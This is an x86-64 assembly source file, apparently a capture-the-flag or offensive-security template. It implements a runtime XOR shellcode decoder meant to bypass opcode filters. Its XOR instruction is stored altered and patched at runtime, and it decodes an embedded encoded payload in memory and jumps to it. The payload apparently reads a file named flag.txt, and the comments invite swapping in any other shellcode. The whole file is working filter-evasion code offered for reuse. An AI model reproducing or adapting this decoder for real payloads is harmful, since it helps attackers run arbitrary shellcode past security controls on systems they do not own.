/*
	-= Runtime shellcode decrypter =-
	> Use to bypass opcode filters
	> Change encodedShellcode bytes with the functionality you want
	> Change last byte of xor_op with XOR key
	> GAS syntax
	> credits to: https://www.ired.team/offensive-security/code-injection-process-injection/writing-custom-shellcode-encoders-and-decoders
*/
.global _start
.intel_syntax noprefix
_start:
	# deobfuscate xor_op
	xor rsi, rsi
	movb sil, [rip+xor_op+1]
	inc sil
	movb [rip+xor_op+1], sil
	jmp short shellcode

decoder:
	pop rax                 # store encodedShellcode address in rax - this is the address that we will jump to once all the bytes in the encodedShellcode have been decoded

setup:
	xor rcx, rcx            # reset rcx to 0, will use this as a loop counter
	mov rdx, 95

decoderStub:
	cmp rcx, rdx            # check if we've iterated and decoded all the encoded bytes
	je encodedShellcode     # jump to the encodedShellcode, which actually now contains the decoded shellcode

	# encodedShellcode bytes are being decoded here per our decoding scheme
	xor rdi, rdi
	movb dil, [rax]
	xor_op: .byte 0x40, 0x7f, 0xf7, 0x0c # obfuscated xor op
	movb [rax], dil

	inc rax                 # point rax to the next encoded byte in encodedShellcode
	inc rcx                 # increase loop counter
	jmp short decoderStub   # repeat decoding procedure

shellcode:
	call decoder            # jump to decoder label. This pushes the address of encodedShellcode to the stack (to be popped into rax as the first instruction under the decoder label)
	encodedShellcode: .byte 0x44, 0xcb, 0xcc, 0xe, 0xc, 0xc, 0xc, 0x44, 0x81, 0x31, 0x3a, 0xc, 0xc, 0xc, 0x44, 0x3d, 0xfa, 0x44, 0x3d, 0xde, 0x3, 0x9, 0x44, 0x85, 0xcb, 0x44, 0x3d, 0xcc, 0x44, 0x85, 0xea, 0x44, 0xcb, 0xce, 0x4c, 0xc, 0xc, 0xc, 0x3, 0x9, 0x44, 0xcb, 0xcc, 0xd, 0xc, 0xc, 0xc, 0x44, 0xcb, 0xcb, 0xd, 0xc, 0xc, 0xc, 0x3, 0x9, 0x44, 0xcb, 0xcc, 0x30, 0xc, 0xc, 0xc, 0x44, 0x3d, 0xf3, 0x3, 0x9, 0x6a, 0x60, 0x6d, 0x6b, 0x22, 0x78, 0x74, 0x78, 0xc
